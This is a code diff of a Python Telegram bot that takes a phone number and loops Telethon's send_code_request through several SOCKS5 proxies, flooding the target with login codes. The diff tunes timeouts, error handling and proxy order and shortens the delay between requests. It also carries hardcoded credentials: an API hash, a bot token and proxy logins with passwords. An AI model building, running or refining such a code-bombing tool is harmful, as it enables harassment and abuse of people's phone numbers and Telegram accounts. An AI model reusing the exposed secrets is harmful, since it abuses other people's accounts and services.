@@ -11,10 +11,10 @@ API_HASH = "11dafcdc1514796c867055023716d39a"
 BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"
 
 proxies = [
+    None,
     {'ip': '185.192.110.221', 'port': 8000, 'user': 'hTJ2Cc', 'password': 'fNxamo'},
     {'ip': '185.191.142.220', 'port': 8000, 'user': 'hTJ2Cc', 'password': 'fNxamo'},
-    {'ip': '185.184.78.155', 'port': 8000, 'user': 'hTJ2Cc', 'password': 'fNxamo'},
-    None
+    {'ip': '185.184.78.155', 'port': 8000, 'user': 'hTJ2Cc', 'password': 'fNxamo'}
 ]
 
 spam_tasks = {}
@@ -37,45 +37,49 @@ async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("Нет активного спама.")
 
-async def send_code(proxy, phone):
+async def try_send(proxy, phone):
+    label = "локальный" if proxy is None else f"{proxy['ip']}:{proxy['port']}"
     try:
         if proxy is None:
-            async with TelegramClient(None, API_ID, API_HASH, connection=ConnectionTcpAbridged, timeout=20) as client:
-                await client.connect()
-                await client.send_code_request(phone)
-                return True, None, "локальный"
+            client = TelegramClient(None, API_ID, API_HASH, connection=ConnectionTcpAbridged)
         else:
             proxy_tuple = (socks.SOCKS5, proxy['ip'], proxy['port'], proxy['user'], proxy['password'])
-            async with TelegramClient(None, API_ID, API_HASH, proxy=proxy_tuple, connection=ConnectionTcpAbridged, timeout=20) as client:
-                await client.connect()
-                await client.send_code_request(phone)
-                return True, None, f"{proxy['ip']}:{proxy['port']}"
+            client = TelegramClient(None, API_ID, API_HASH, proxy=proxy_tuple, connection=ConnectionTcpAbridged)
+        async with client:
+            await asyncio.wait_for(client.connect(), timeout=10)
+            await asyncio.wait_for(client.send_code_request(phone), timeout=10)
+        return True, label, None
     except FloodWaitError as e:
-        return True, e.seconds, "локальный" if proxy is None else f"{proxy['ip']}:{proxy['port']}"
+        return True, label, f"FloodWait {e.seconds} сек"
+    except asyncio.TimeoutError:
+        return False, label, "таймаут"
     except Exception as e:
-        return False, str(e)[:60], "локальный" if proxy is None else f"{proxy['ip']}:{proxy['port']}"
+        err = str(e)
+        if "Connection to Telegram failed" in err:
+            return False, label, "conn_fail"
+        elif "ResendCodeRequest" in err or "all available options" in err:
+            return False, label, "all_used"
+        else:
+            return False, label, err[:50]
 
 async def spam_worker(phone, chat_id, context):
     count = 0
-    fail_count = 0
     idx = 0
     while True:
         proxy = proxies[idx % len(proxies)]
         idx += 1
-        success, msg, label = await send_code(proxy, phone)
+        success, label, msg = await try_send(proxy, phone)
         if success:
-            if isinstance(msg, int):
-                await context.bot.send_message(chat_id, f"FloodWait {msg} сек на {label}")
-                await asyncio.sleep(msg)
+            if msg and "FloodWait" in msg:
+                await context.bot.send_message(chat_id, f"{label} -> {msg}")
+                sec = int(msg.split()[1])
+                await asyncio.sleep(sec)
             else:
                 count += 1
                 await context.bot.send_message(chat_id, f"Код #{count} отправлен через {label}")
-                fail_count = 0
         else:
-            fail_count += 1
-            if fail_count % 3 == 0:
-                await context.bot.send_message(chat_id, f"Ошибка {fail_count} раз подряд: {msg} на {label}")
-        await asyncio.sleep(0.5)
+            await context.bot.send_message(chat_id, f"Ошибка на {label}: {msg}")
+        await asyncio.sleep(0.3)
 
 async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phone = update.message.text.strip()
@@ -89,7 +93,7 @@ async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     task = asyncio.create_task(spam_worker(phone, chat_id, context))
     spam_tasks[chat_id] = (task, client)
-    await update.message.reply_text("Спам запущен (3 прокси + локальный). Для остановки /stop")
+    await update.message.reply_text("Спам запущен (сначала локальный, затем 3 прокси). Ошибки выводятся сразу.")
 
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
